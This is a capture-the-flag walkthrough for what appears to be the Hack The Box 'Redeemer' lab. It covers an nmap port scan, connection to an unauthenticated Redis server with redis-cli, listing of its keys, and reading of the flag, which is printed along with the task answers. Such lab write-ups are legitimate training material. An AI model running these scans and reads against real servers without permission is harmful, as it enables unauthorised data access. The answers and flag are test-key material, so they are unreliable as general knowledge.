# Redeemer

Really?! What the hell is up with this name?

## Task 1

> Which TCP port is open on the machine?

6379

```
nmap -p- 10.129.156.42
```

```out
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-10 00:02 EDT
Nmap scan report for 10.129.156.42
Host is up (0.046s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

Maximum number of port is 65535.

## Task 2

> Which TCP port is open on the machine?

redis

## Task 3

> What type of database is Redis? Choose from the following options: (i)
In-memory Database, (ii) Traditional Database

in-memory database

## Task 4

> Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. 

redis-cli

* Redis CLI \| Redis  
  <https://redis.io/docs/manual/cli/>

## Task 5

> Which flag is used with the Redis command-line utility to specify the hostname?

-h

```
sudo apt install redis-tools
redis-cli -h
```

## Task 6

> Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?

info

## Task 7

> What is the version of the Redis server being used on the target machine?

```
10.129.156.42:6379> info
# Server
redis_version:5.0.7
```

## Task 8

> Which command is used to select the desired database in Redis?

```
10.129.156.42:6379> help select

  SELECT index
  summary: Change the selected database for the current connection
  since: 1.0.0
  group: connection
```

## Task 9

> How many keys are present inside the database with index 0?

```
10.129.156.42:6379> select 0
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

## Task 10

> Which command is used to obtain all the keys in a database?

```
10.129.156.42:6379> keys *
1) "flag"
2) "numb"
3) "temp"
4) "stor"
```

## Task 11

> Submit flag.

```
10.129.156.42:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```
